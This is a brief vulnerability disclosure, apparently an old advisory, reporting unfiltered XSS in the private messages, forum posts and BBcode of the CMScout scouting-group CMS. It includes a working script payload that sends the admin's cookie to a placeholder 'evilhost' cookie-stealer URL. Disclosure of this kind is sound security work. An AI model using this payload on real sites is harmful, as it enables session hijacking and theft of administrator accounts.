CMScout is a CMS (Content management system) for scouting related groups from around the world.
A CMS is a piece of web software that makes it easy for you to install, and manage a website.
CMScout includes all the features of other major CMS's that are available (Like PHP-Nuke, Mambo, e107, etc.).

Added news items and events are properly filtered for potential XSS input, input in the forums and PM's however, is not.
For example, when one would send a pm to the admin like this:

Subject: whatever
Body: <script>window.navigate('http://www.evilhost.com/cookiestealer.php?c='+document.cookie)</script>

we could obtain the admin's cookie. The inside of BBcode isn't filtered either. This goes for the forums too.
